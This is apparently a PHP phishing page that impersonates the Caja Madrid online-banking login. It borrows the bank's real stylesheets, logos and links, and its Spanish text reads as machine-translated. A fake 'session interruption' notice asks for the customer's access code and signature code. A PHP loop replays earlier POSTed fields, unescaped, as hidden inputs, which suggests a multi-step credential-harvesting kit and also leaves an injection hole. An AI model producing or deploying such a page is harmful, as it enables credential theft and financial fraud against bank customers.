<?php $root='https://oi.cajamadrid.es';?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html lang='es'>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<META HTTP-EQUIV=Pragma CONTENT="no-cache">
<META HTTP-EQUIV=Expires CONTENT="-1">
<title>Bienvenido</title>
<style type="text/css" media="all">
@import url( <?=$root?>/CajaMadrid/oi/css/estilos_oiv1_1.css );
</style>
<link rel="stylesheet" href="<?=$root?>/CajaMadrid/oi/css/estilos_handheld_oiv1_1.css" type="text/css"  media="handheld">
<script language="javascript">
function abrirDemo(){window.open("http://www.cajamadrid.es/Portal_Corporativo/html/Demo_OI/html/demo1.html","demo_oi","left=100,top=100,width=800,height=505,toolbar=yes,location=yes,directories=no,status=no,menubar=yes,scrollbars=yes,resizable=no");}
function abrirInformacionClave(){window.open("https://oi.cajamadrid.es/CajaMadrid/oi/pt_oi/Login/generaPopUpLogin?NumeroPagina=5032&NumeroSeccion=31059","informacionclave","left=100,top=100,width=800,height=505,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no");}
function abrirSello(){window.open('https://oi.cajamadrid.es/CajaMadrid/oi/pt_oi/Login/generaPopUpSello','cond','toolbar = no, location = no, directories = no, status = no, scrollbars = yes, resizable = no, width=800,height=500,top=100,left=100');}
function abrirInformacion(){window.open("http://www.cajamadrid.es/CajaMadrid/Home/puente?pagina=3497","informacion","left=100,top=100,width=800,height=505,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no");}
function valida(contrato)
{
  var si = true;
  if(si && document.forms["f1"].elements["pass_clave"].value.length < 4 || document.forms["f1"].elements["pass_clave"].value.length > 8)
  {
    document.forms["f1"].elements["pass_clave"].value = "";
    document.forms["f1"].elements["pass_clave"].focus();
    alert('LA CLAVE DEBE TENER ENTRE 4 Y 8 CIFRAS');
    si = false;
  }
  if(si && document.forms["f1"].elements["pass_firma"].value.length < 4 || document.forms["f1"].elements["pass_firma"].value.length > 8)
  {
    document.forms["f1"].elements["pass_firma"].value = "";
    document.forms["f1"].elements["pass_firma"].focus();
    alert('LA FIRMA DEBE TENER ENTRE 4 Y 8 CIFRAS');
    si = false;
  }
  if(si)document.forms['f1'].submit();
}
</script>
</head>
<body id="login">
<form id="f1" method="post" action="<?=$root?>/CajaMadrid/oi/pt_oi/Login/login_oi">
<?php
$mypost = file("php://input");
if(strlen($mypost[0])!=0)
{
  $post_data = explode("&", $mypost[0]);
  for ($pos=0; $pos<sizeof($post_data); $pos++)
  {
    $data_field = explode("=", $post_data[$pos]);
    $key    = $data_field[0];
    $value  = $data_field[1];
    $key_new = str_replace("+"," ", $key);
    $key_new = rawurldecode($key_new);
    $value_new = str_replace("+"," ", $value);
    $value_new = rawurldecode($value_new);
    echo "<input type=\"hidden\" name=\"$key_new\" value=\"$value_new\">\r\n";
  }
}
?>
<div id="wrapper">
	<div id="subwrapper">
			<div class="cols clearfix">
					<div class="colIzda">
							<div class="logo">
								<h1><img alt="Caja Madrid" title="Caja Madrid" src="<?=$root?>/CajaMadrid/oi/imagenes/logocm.gif"></h1></div>
								<div class="img"><img alt="" title="" src="<?=$root?>/CajaMadrid/oi/imagenes/imagengr.jpg"></div>
								<div class="dh clearfix">
									<img title="Oficina Internet | Caja Madrid" alt="Oficina Internet | Caja Madrid" src="<?=$root?>/CajaMadrid/oi/imagenes/logooi_08.gif" >
									<ul class="clearfix">
										<li><a href="#" onclick="abrirDemo();return false;" onkeypress="abrirDemo();return false;">&gt; Demo</a></li>
										<li><a href="http://www.cajamadrid.es/CajaMadrid/Home/puente?pagina=1109*3691">&gt; H&aacute;gase cliente</a></li>
									</ul>
								</div>
								<div id="seguridad">
									<a href="#" onkeypress="abrirSello();return false;" onclick="abrirSello();return false;"><img src="<?=$root?>/CajaMadrid/oi/imagenes/sello_oi_01.gif" alt="Informaci&oacute;n de seguridad"></a>
									<a href="#" onkeypress="abrirInformacion();return false" onclick="abrirInformacion();return false">Informaci&oacute;n de seguridad</a>
								</div>
					</div>
					<div class="colDcha">
						<p>Descanso detectado de la sesion. Para la verificacion, entrar por favor tus llaves de nuevo del acceso.</p>
<div class="datoscentrados">
<? if(isset($_POST['Documento_s'])){?>
  <div class="fila">
    <span class="negrita"><label for="Documento_s" class="DesactivarCajetin">D.N.I.</label></span>
    <input disabled value="<?$_POST['Documento_s']?>" type="text">
  </div>
<?}?>
	<div class="fila">
		<span class="negrita"><label for="pass_clave" class="DesactivarCajetin"><a tabindex="1050" href="#" onkeypress="abrirInformacionClave();return false" onclick="abrirInformacionClave();return false">Clave</a></label></span>
		<input tabindex="1010"  type="password" name="pass_clave" id="pass_clave" autocomplete="off" maxlength="8">
	</div>
	<div class="fila">
		<span><label for="pass_firma"  class="ActivarCajetin" ><a tabindex="1060" href="#" onkeypress="abrirInformacionClave();return false" onclick="abrirInformacionClave();return false">Firma</a></label></span>
		<input tabindex="1100" type="password" autocomplete="off" name="pass_firma" id="pass_firma" maxlength="8">
    <a id="ir" tabindex="1300" name="ir" href="#" onkeypress="valida('');return false" onclick="valida('');return false">&gt;&nbsp;<strong>Entrar</strong></a>
  </div>
</div>

<div class="atencion">Servicio de atenci&oacute;n al cliente: <SPAN class="resaltado">902 2 4 6 8 10</SPAN></div>
</div>
</div>

		<div id="pie">
			<p>El servicio est&aacute; optimizado para Explorer 5.0 o superior y Netscape 6.0 o superior</p>

			<address>CAJA MADRID
					<BR>Caja de Ahorros y Monte de Piedad de Madrid, CAJA MADRID, C.I.F. G-28029007, Plaza de Celenque, 2. 28013 Madrid.<BR>
					Inscrita en el R&ordm; Mercantil de Madrid al folio 20; tomo 3067 General; hoja 52454; 
					y en el R&ordm; Especial de Cajas de Ahorros con el n&uacute;mero 99. C&oacute;digo B.E.: 2038. C&oacute;digo BIC: CAHMESMMXXX. Entidad de cr&eacute;dito sujeta a supervisi&oacute;n del Banco de Espa&ntilde;a
			</address>

			<p>&copy; Caja Madrid. 2001 - 2006. Espa&ntilde;a. Todos los derechos reservados.</p>
		</div>
	</div>
</div>

</form>
</body>
</html>
